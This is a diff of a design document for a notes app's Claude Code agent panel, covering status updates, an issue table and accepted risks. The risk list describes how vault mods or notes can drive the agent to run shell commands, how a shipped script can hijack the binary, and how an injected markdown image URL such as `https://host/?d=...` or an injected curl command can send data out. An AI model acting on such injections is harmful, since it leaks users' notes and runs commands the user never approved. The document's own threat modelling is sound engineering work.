@@ -1,6 +1,6 @@
 # Claude Code integration: an agent panel for the vault through the `claude` CLI
 
-**Status:** ready-for-agent (Issues 01-03)
+**Status:** MVP delivered (01, 02, 03, 05, 07, 08); PR #247 review follow-ups 10-13; 09 open
 
 ## Goal
 
@@ -43,8 +43,11 @@ One turn = one process. Follow-up turns pass `--resume <session_id>` from the pr
 
 - **Dirty tabs win over disk.** `reloadExternallyChangedTabs` (`src/lib/core/editor/editor.service.ts:477-512`) skips dirty tabs, and the next auto-save writes the editor content back, silently undoing Claude's edit. Every turn must first flush dirty tabs (`saveAllDirtyTabs`, same file, line 324). An edit the user types into a note while a turn is running can still overwrite Claude's change to that note; the panel says so while a turn runs.
 - **Full permissions.** With `bypassPermissions` the agent runs any shell command and writes anywhere the user can, with no prompt. This is the owner's choice; the Settings toggle that enables the feature states it.
+- **Any webview code can drive the agent.** App commands have no IPC ACL (ADR-0036, Consequences), and both vault mods and QueryJS blocks in any note run in the main webview (`src/lib/plugins/queryjs/kb-api.ts:414`), so they can call `claude_run_turn` and, through `bypassPermissions`, run shell commands. Accepted while the owner writes every mod and note in the vault; revisit together with ADR-0036's triggers (a mod or vault from someone else). The commands only run a binary named `claude` (Issue 02), so they are not a generic exec primitive.
+- **Settings live in the vault.** `claudeCode.*` (enabled, override path, privacy acknowledged) persist in `<vault>/.kokobrain/settings.json`, so a vault from elsewhere could arrive with the feature on and an override pointing at a `claude` script it ships, which the Settings section runs. Accepted by the owner (sole user, writes every vault); Issue 04, which moved them to per-machine storage, is wontfix.
+- **Remote images in replies.** Replies render through the canvas Markdown sanitizer, which keeps `img`, and the CSP allows `img-src https:`, so an injected `![](https://host/?d=...)` in a reply is fetched when it renders. Accepted by the owner: the same injection can make Claude run `curl` under `bypassPermissions`. Issue 06, which turns remote images into links, is wontfix.
 - **Privacy.** Kokobrain does no network calls outside the allowlist in `.github/workflows/privacy.yml`. The `claude` process sends note content to Anthropic under the user's own Claude Code account. The feature is off by default, enabling it shows that sentence once, and no Kokobrain code makes the HTTP call.
-- **GUI PATH.** A macOS app launched from Finder does not inherit the login shell PATH. Resolve `claude` via `$SHELL -lc 'command -v claude'`, then known install paths (`~/.local/bin`, `~/.claude/local`, Homebrew), with an override path in Settings.
+- **GUI PATH.** A macOS app launched from Finder does not inherit the login shell PATH. The Settings status and a turn resolve `claude` the same way: on the `PATH` of the captured login interactive shell env (`$SHELL -l -i`, Issue 05), then known install paths (`~/.local/bin`, `~/.claude/local`, Homebrew), and run it with that env (Issue 10). Only when the capture failed does the lookup ask `$SHELL -lc 'command -v claude'` before the install paths. An override path in Settings must be an absolute path to a file named `claude`. Only the Settings section (on open and "Check again") recaptures the env, and a failed recapture keeps the last good one. The same env reaches the child: `claude` and the MCP servers it starts need the shell's PATH and exported variables.
 
 ## Later (not v1)
 
@@ -54,6 +57,16 @@ Changed-files summary and revert (git diff when the vault is a repo, as Tolaria 
 
 | # | Issue | Blocked by | Status |
 |---|---|---|---|
-| [01](issues/01-claude-binary-detection.md) | Detect the `claude` binary and show its status in Settings | none | ready-for-agent |
-| [02](issues/02-rust-turn-runner.md) | Rust turn runner: spawn, NDJSON to events, cancel | 01 | ready-for-agent |
-| [03](issues/03-claude-chat-panel.md) | Agent panel: chat, note context, slash commands | 02 | ready-for-agent |
+| [01](issues/01-claude-binary-detection.md) | Detect the `claude` binary and show its status in Settings | none | resolved |
+| [02](issues/02-rust-turn-runner.md) | Rust turn runner: spawn, NDJSON to events, cancel | 01 | resolved |
+| [03](issues/03-claude-chat-panel.md) | Agent panel: chat, note context, slash commands | 02 | resolved |
+| [04](issues/04-claude-settings-per-machine.md) | Claude Code settings per machine, not in the vault | 01 | wontfix |
+| [05](issues/05-login-shell-env-for-claude.md) | Run `claude` with the login shell's environment | 02 | resolved |
+| [06](issues/06-remote-images-in-replies.md) | Remote images in Claude replies can leak data | 03 | wontfix |
+| [07](issues/07-cancel-misses-a-child-forked-during-killpg.md) | Cancel misses a child forked during `killpg` | 05 | resolved |
+| [08](issues/08-real-stream-json-fixture.md) | Replace the hand-written stream-json fixture with a real capture | 03 | resolved |
+| [09](issues/09-stale-run-after-vault-switch.md) | A run started before a vault switch leaks into the new vault's chat | 03 | needs-triage |
+| [10](issues/10-status-uses-turn-env.md) | The status check finds `claude` the way a turn does | 05 | ready-for-agent |
+| [11](issues/11-cancel-turns-on-app-exit.md) | Quitting the app cancels running turns | 07 | ready-for-agent |
+| [12](issues/12-panel-scroll-focus-keys.md) | Panel follows the reply, keeps focus, and handles IME and slash-menu keys | 10 | ready-for-agent |
+| [13](issues/13-stream-session-errors-retries.md) | Stream and chat keep the session, the error cause and retried text right | 12 | ready-for-agent |
